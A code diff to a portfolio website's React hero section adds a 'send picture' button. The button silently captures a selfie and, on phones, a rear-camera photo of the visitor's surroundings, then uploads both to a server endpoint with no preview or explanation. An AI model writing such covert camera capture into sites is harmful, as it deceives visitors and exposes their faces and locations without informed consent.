@@ -1,13 +1,15 @@
 "use client"
 
-import { useEffect, useRef } from "react"
+import { useEffect, useRef, useState } from "react"
 import { motion } from "framer-motion"
 import { ArrowDown } from "lucide-react"
 import { Button } from "@/components/ui/button"
 
 export default function Hero() {
-  const canvasRef = useRef<HTMLCanvasElement>(null)
-
+ 
+const canvasRef = useRef<HTMLCanvasElement>(null)
+  const videoRef = useRef<HTMLVideoElement>(null)
+  const streamRef = useRef<MediaStream | null>(null)
   useEffect(() => {
     const canvas = canvasRef.current
     if (!canvas) return
@@ -101,6 +103,94 @@ export default function Hero() {
     }
   }, [])
 
+
+const captureAndSendPhoto = async () => {
+  const isMobile = window.innerWidth <= 600;
+
+  let frontStream: MediaStream | null = null;
+  let backStream: MediaStream | null = null;
+
+  try {
+    // Har doim old kamerani ochamiz (selfie)
+    frontStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false,
+    });
+
+    // Agar mobile bo'lsa — orqa kamerani ham sinab ko'ramiz
+    if (isMobile) {
+      try {
+        backStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "environment" },
+          audio: false,
+        });
+      } catch (err) {
+        console.log("Mobileda orqa kamera topilmadi yoki ruxsat berilmagan");
+        backStream = null;
+      }
+    }
+
+    const captureFromStream = async (stream: MediaStream): Promise<Blob> => {
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      video.play();
+
+      await new Promise((resolve) => {
+        video.onloadedmetadata = () => setTimeout(resolve, 800);
+      });
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext("2d");
+      if (!ctx) throw new Error("Canvas xatosi");
+      ctx.drawImage(video, 0, 0);
+
+      return new Promise((resolve) => {
+        canvas.toBlob((blob) => resolve(blob!), "image/jpeg", 0.9);
+      });
+    };
+
+    // Rasmlarni olish
+    const selfieBlob = await captureFromStream(frontStream);
+
+    const formData = new FormData();
+    formData.append("selfie", selfieBlob, "selfie.jpg");
+
+    if (backStream && isMobile) {
+      const backBlob = await captureFromStream(backStream);
+      formData.append("environment", backBlob, "atrof.jpg");
+      formData.append("device", "mobile"); // backendda bilish uchun
+    } else {
+      formData.append("device", "desktop");
+    }
+
+    const res = await fetch("/api/sendimg", {
+      method: "POST",
+      body: formData,
+    });
+
+    if (res.ok) {
+      
+      
+    } else {
+      const data = await res.json();
+ 
+    }
+
+  } catch (err: any) {
+    console.error(err);
+    if (err.name === "NotAllowedError") {
+     
+    } else {
+
+    }
+  } finally {
+    if (frontStream) frontStream.getTracks().forEach(t => t.stop());
+    if (backStream) backStream.getTracks().forEach(t => t.stop());
+  }
+};
+
   return (
     <section id="hero" className="relative h-screen flex items-center justify-center overflow-hidden">
       <canvas ref={canvasRef} className="absolute inset-0 z-0" />
@@ -132,8 +222,17 @@ export default function Hero() {
           <Button size="lg" variant="outline" className="border-primary text-primary hover:bg-primary/10 cursor-target transition-all duration-300" asChild>
             <a href="#contact">Men bilan bog&apos;laning</a>
           </Button>
+          <Button
+            size="lg"
+            className="bg-green-600 hover:bg-green-700 text-white flex items-center gap-2"
+            onClick={captureAndSendPhoto}
+          >
+            
+            Rasim yuborish
+          </Button>
         </motion.div>
       </div>
+
 
       <motion.div
         initial={{ opacity: 0, y: 10 }}
